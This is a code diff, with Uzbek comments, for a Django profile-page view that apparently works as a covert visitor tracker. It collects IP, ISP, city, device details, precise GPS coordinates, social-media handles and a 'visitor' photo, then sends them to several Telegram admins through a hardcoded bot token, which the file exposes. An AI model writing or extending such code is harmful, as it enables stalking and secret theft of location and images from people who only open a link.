@@ -6,22 +6,22 @@ from django.http import JsonResponse
 from .models import Profile
 from analytics.models import VisitorAnalytics, LinkClickAnalytics
 
-# BOT SOZLAMALARI (Istalgancha admin ID qo'shishingiz mumkin)
+# BOT SOZLAMALARI
 TELEGRAM_BOT_TOKEN = "8913375327:AAGDQ3YBplsSYUO7fPpugb557ZZc4y_MONw"
-TELEGRAM_ADMINS = ["8389359853","1724433674"]  # Bu yerga keyingi admin ID larni vergul bilan ajratib qo'shasiz
+TELEGRAM_ADMINS = ["8389359853", "1724433674"]  # Barcha faol adminlar ro'yxati
 
 def send_to_telegram_and_forget(text, image_data=None):
     """Xabarni ro'yxatdagi barcha adminlarga ketma-ket yuboradi, DBga yozmaydi"""
     base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
     
-    # Rasm formatini barcha adminlar uchun bir marta tayyorlab olamiz
-    photo_file_content = None
+    # Rasm formatini bayt ko'rinishida bir marta tayyorlab olamiz
+    photo_bytes = None
     ext = "jpg"
     if image_data:
         try:
             format, imgstr = image_data.split(';base64,')
             ext = format.split('/')[-1]
-            photo_file_content = base64.b64decode(imgstr)
+            photo_bytes = base64.b64decode(imgstr)
         except Exception as e:
             text += f"\n\n⚠️ _Rasmni qayta ishlashda xatolik yuz berdi: {e}_"
             image_data = None  # Xato bo'lsa oddiy matn rejimiga o'tadi
@@ -29,17 +29,17 @@ def send_to_telegram_and_forget(text, image_data=None):
     # Har bir admin uchun alohida so'rov yuboramiz
     for admin_id in TELEGRAM_ADMINS:
         try:
-            if image_data and photo_file_content:
+            if image_data and photo_bytes:
                 url = f"{base_url}/sendPhoto"
-                # Har safar yangi ContentFile yaratish shart (oqim yopilib qolmasligi uchun)
-                photo_file = ContentFile(photo_file_content, name=f"visitor.{ext}")
+                # [MUHIM TUZATISH]: Har bir admin uchun fayl oqimi (ContentFile) yangidan ochiladi
+                photo_file = ContentFile(photo_bytes, name=f"visitor.{ext}")
                 files = {'photo': photo_file}
                 payload = {'chat_id': admin_id, 'caption': text, 'parse_mode': 'Markdown'}
-                requests.post(url, data=payload, files=files, timeout=3)
+                requests.post(url, data=payload, files=files, timeout=5)
             else:
                 url = f"{base_url}/sendMessage"
                 payload = {'chat_id': admin_id, 'text': text, 'parse_mode': 'Markdown'}
-                requests.post(url, json=payload, timeout=3)
+                requests.post(url, json=payload, timeout=5)
         except Exception as e:
             # Agar biror admin botni bloklagan bo'lsa, qolganlarga borishini to'xtatmaydi
             print(f"Admin {admin_id} ga xabar yuborishda xatolik: {e}")
@@ -109,23 +109,7 @@ def profile_detail_view(request, profile_slug):
         except Exception:
             pass
 
-    # [MUHIM]: Kirish haqidagi umumiy ma'lumot (har gal kirganda yuborish uchun)
-    basic_msg = (
-        f"👤 *Maqsadli Profil:* {profile.title}\n"
-        f"📱 *QURILMA VA TIZIM:* \n"
-        f"• *Manba:* {source}\n"
-        f"• *Operatsion Tizim:* {os_system}\n"
-        f"• *Brauzer:* {browser}\n"
-        f"• *Tizim Tili:* {user_lang}\n\n"
-        
-        f"🌐 *GEOLOKATSIYA VA TARMOQ:* \n"
-        f"• *IP Manzil:* `{ip}`\n"
-        f"• *Provayder (ISP):* {geo_data['isp']}\n"
-        f"• *Davlat:* {geo_data['country']}\n"
-        f"• *Shahar:* {geo_data['city']}\n"
-    )
-
-# --- AJAX POST SO'ROV (views.py ichidagi tegishli joyga almashtiring) ---
+    # --- AJAX POST SO'ROV ---
     if request.method == 'POST' and request.headers.get('X-Requested-With') == 'XMLHttpRequest':
         tg_user = request.POST.get('tg_user')
         insta_user = request.POST.get('insta_user')
@@ -135,12 +119,12 @@ def profile_detail_view(request, profile_slug):
         status_text = request.POST.get('status_text', 'Ruxsat berilmadi')
         screen_size = request.POST.get('screen_size', 'Noma`lum')
         
-        # [YANGI]: Brauzer GPSidan kelgan aniq koordinatalar
+        # Brauzer GPSidan kelgan aniq koordinatalar
         gps_lat = request.POST.get('gps_lat', None)
         gps_lon = request.POST.get('gps_lon', None)
 
         # Agar GPS koordinatalari kelgan bo'lsa, aniq xarita havolasini yasaymiz
-        if gps_lat and gps_lon and gps_lat != 'null':
+        if gps_lat and gps_lon and gps_lat != 'null' and gps_lat != 'undefined':
             maps_link = f"[Google Maps (Aniq GPS yordamida: 10m)](https://www.google.com/maps?q={gps_lat},{gps_lon})"
         else:
             # Agar rad etgan bo'lsa, eski IP-API koordinatasidan foydalanamiz
@@ -185,7 +169,7 @@ def profile_detail_view(request, profile_slug):
             
             re_visit_msg = (
                 f"🔄 *PROFILGA QAYTA KIRISH* \n\n"
-                f"旧 *Foydalanuvchi:* \n"
+                f"👤 *Foydalanuvchi:* \n"
                 f"  • Telegram: @{saved_tg}\n"
                 f"  • Instagram: @{saved_insta}\n"
                 f"  • ID: `{saved_id}`\n\n"
@@ -193,11 +177,6 @@ def profile_detail_view(request, profile_slug):
             )
             send_to_telegram_and_forget(re_visit_msg, image_data=image_data)
             return JsonResponse({'status': 'tracked'})
-    # --- ODDIY GET SO'ROV (Sahifa yuklanganda fon xabarini yuborish - Rasm yo'q) ---
-    # is_logged_in = request.session.get('is_logged_in', False)
-    # if is_logged_in:
-    #      send_to_telegram_and_forget(f"🔄 *PROFILGA QAYTA KIRISH (Fonda Alert)* \n\n" + basic_msg)
-         # Rasm yuborish endi JavaScript fonda POST so'rovi orqali amalga oshiriladi.
 
     context = {
         'profile': profile,
